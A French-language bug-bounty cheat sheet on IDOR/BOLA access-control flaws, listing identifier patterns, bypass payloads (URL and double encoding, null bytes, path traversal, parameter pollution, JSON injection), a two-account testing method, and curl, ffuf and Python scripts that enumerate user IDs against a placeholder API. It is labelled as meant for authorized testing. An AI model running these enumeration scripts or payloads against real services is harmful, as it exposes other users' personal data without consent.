# 🔓 IDOR — référence directe non sécurisée à un objet

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Insecure Direct Object Reference
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

> **Interprétation :** une référence directe n’est pas une faille à elle seule : il faut démontrer un accès ou une action non autorisés sur l’objet. Un statut 200 ou la présence du mot `email` n’est qu’un indice. Les conséquences du modèle de rapport doivent correspondre aux objets et opérations réellement vérifiés, pas à une généralisation automatique à tous les utilisateurs. Voir la [fiche de prévention IDOR d’OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html).
>
> **Identifiants et exemples :** UUID, empreinte ou encodage ne remplacent pas le contrôle d’autorisation. Les identifiants et variantes proposés sont illustratifs et ne garantissent aucun contournement. Les commandes Base64 sources utilisent `echo`, qui ajoute normalement un saut de ligne : les sorties montrées omettent cet octet. Les lignes sources, y compris les annotations `Blocked`, `Allowed?` et `Full-width 124`, sont conservées ; elles signifient respectivement « bloqué », « autorisé ? » et « 124 en caractères pleine chasse ». Le tableau IDOR/BOLA rétablit la cellule manquante pour placer la définition de BOLA dans sa colonne. Le dessin ASCII conserve le texte source.

## 📋 Table des matières

- [Qu’est-ce qu’une IDOR](#-quest-ce-quune-idor)
- [Où chercher](#-où-chercher)
- [Types d’identifiants et manipulation](#-types-didentifiants-et-manipulation)
- [Techniques de contournement](#-techniques-de-contournement)
- [Méthodologie de test](#-méthodologie-de-test)
- [Outils et automatisation](#-outils-et-automatisation)

---

## 🎯 Qu’est-ce qu’une IDOR

Une **IDOR** apparaît lorsqu’une application expose des références directes à des objets internes (enregistrements de base de données, fichiers, etc.) sans contrôle d’autorisation approprié.

### Conséquences
- 🔴 **Vol de données** — Accéder aux données d’autres utilisateurs
- 🔴 **Élévation de privilèges** — Accéder aux fonctions d’administration
- 🔴 **Prise de contrôle de compte** — Modifier d’autres comptes
- 🔴 **Manipulation des données** — Supprimer ou modifier des enregistrements

### IDOR et BOLA
| IDOR | BOLA |
|------|------|
| Terme traditionnel | Terme employé en sécurité des API |
| — | Autorisation défaillante au niveau des objets (Broken Object Level Authorization) |

---

## 🔍 Où chercher

### Paramètres d’URL
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### Corps POST/PUT
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### En-têtes
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Paramètres courants
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### Points de terminaison courants
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

## 🔢 Types d’identifiants et manipulation

### Identifiants séquentiels
```
# Cas courant : incrémenter ou décrémenter l’identifiant
/api/users/1
/api/users/2
/api/users/3

# Tester les valeurs limites
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUIDs
```
# Vérifier si les identifiants sont réellement aléatoires
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Incrémenter la dernière partie

# Rechercher des motifs
# UUID temporels (v1) : présentés comme prévisibles dans la source
# UUID aléatoires (v4) : plus difficiles à deviner
```

### Identifiants encodés
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Tester les valeurs encodées
/api/users/MTIz  → decode = 123
/api/users/MTI0  → decode = 124

# Encodage hexadécimal
123 → 7b
124 → 7c
```

### Identifiants hachés
```
# Empreinte MD5 de l’identifiant
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Essayer différents algorithmes
# Vérifier si l’empreinte provient d’un identifiant ou d’une valeur aléatoire
```

### Formats personnalisés
```
# Identifiants préfixés
/user/USR_123
/order/ORD_456
/doc/DOC_789

# Identifiants fondés sur un horodatage
/file/20240128_001
/file/20240128_002
```

---

<a id="-techniques-de-contournement"></a>
## 🛡️ Techniques de contournement

### Manipulation des paramètres
```bash
# Original
GET /api/users/123

# Variantes
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### Changement de méthode HTTP
```bash
# Si GET est bloqué, essayer d’autres méthodes
GET /api/users/124     → Blocked
POST /api/users/124    → Allowed?
PUT /api/users/124     → Allowed?
```

### Encapsulation dans des tableaux ou des objets
```json
// Si id=124 est bloqué, essayer :
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Contournement par encodage
```
# Encodage d’URL
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Double encodage
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → Full-width 124
```

### Modification de la casse
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### Combinaison avec une traversée de répertoires
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### Octet nul
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

### Injection de paramètres JSON
```json
// Requête originale
{"user_id": 123, "action": "view"}

// Test
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP (HTTP Parameter Pollution, pollution des paramètres HTTP)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

## 📋 Méthodologie de test

### Étape 1 : repérer
```
1. Recenser les points de terminaison contenant des références à des objets
2. Noter les paramètres qui ressemblent à des identifiants
3. Créer deux comptes de test (utilisateur A et utilisateur B)
```

### Étape 2 : inventorier
```
1. Avec le compte A, noter ses identifiants d’objets
2. Avec le compte B, noter ses identifiants d’objets
3. Repérer les motifs des identifiants
```

### Étape 3 : tester
```
1. Avec le compte A, tenter d’accéder aux objets du compte B
2. Tester toutes les opérations CRUD :
   - Lecture (GET)
   - Création (POST)
   - Mise à jour (PUT/PATCH)
   - Suppression (DELETE)
```

### Étape 4 : approfondir
```
1. Essayer les identifiants d’administration illustrés par la source (1, admin, 0)
2. Essayer des valeurs particulières (null, undefined, *)
3. Combiner avec d’autres vulnérabilités
```

### Liste de contrôle
```markdown
- [ ] Paramètres d’URL
- [ ] Paramètres du corps POST
- [ ] En-têtes, cookies et en-têtes personnalisés
- [ ] Champs de formulaire cachés
- [ ] Points de terminaison des API
- [ ] Téléchargements de fichiers
- [ ] Fonctions d’export
- [ ] Fonctions de suppression
- [ ] Fonctions d’administration
```

---

<a id="-outils-et-automatisation"></a>
## 🛠️ Outils et automatisation

### Extensions de Burp Suite
```
- Autorize (aide à la détection automatisée des IDOR)
- AuthMatrix
- Auto Repeater
```

### Configuration d’Autorize
```
1. Installer l’extension Autorize
2. Copier le cookie de session de l’utilisateur B
3. L’ajouter dans Autorize
4. Naviguer avec le compte A
5. Autorize teste les requêtes avec la session du compte B
```

### Tests manuels avec curl
```bash
# Jeton de l’utilisateur A
TOKEN_A="user_a_jwt_token"

# Tester une ressource de l’utilisateur B
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# Parcourir les identifiants
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### ffuf pour rechercher des IDOR
```bash
# Identifiants numériques
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# Avec une liste de mots
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Script Python
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

## 📊 Référence rapide

### Fonctions fréquemment concernées
| Fonction | Risque |
|----------|------|
| Consulter un profil | Fuite de données |
| Télécharger un fichier | Accès à un fichier |
| Supprimer un élément | Perte de données |
| Modifier des réglages | Prise de contrôle de compte |
| Consulter des commandes | Atteinte à la vie privée |
| Exporter des données | Vol massif de données |

### Éléments à signaler
```markdown
## IDOR dans un profil utilisateur

**Point de terminaison :** GET /api/users/{id}

**Étapes :**
1. Se connecter avec le compte A (ID: 123)
2. Envoyer la requête GET /api/users/124
3. Constater que les données du compte B sont renvoyées

**Conséquences :** tout utilisateur authentifié peut accéder aux
informations personnelles de tous les autres utilisateurs.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 Conseils pratiques

1. **Utiliser deux comptes** — Toujours effectuer les tests avec 2 comptes
2. **Vérifier toutes les méthodes** — GET, POST, PUT, DELETE
3. **Chercher partout** — URL, corps, en-têtes et cookies
4. **Tester les valeurs limites** — 0, -1, null, undefined
5. **Combiner les vulnérabilités** — IDOR + CSRF, IDOR + XSS
6. **Vérifier les exports** — La source signale notamment les exports PDF et CSV
7. **Vérifier les API mobiles** — La source les présente comme parfois moins sécurisées que le Web

---

## 📚 Ressources

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [PortSwigger Access Control](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 Repérez les failles IDOR !</b><br>
  <i>Uniquement pour des tests autorisés !</i>
</p>
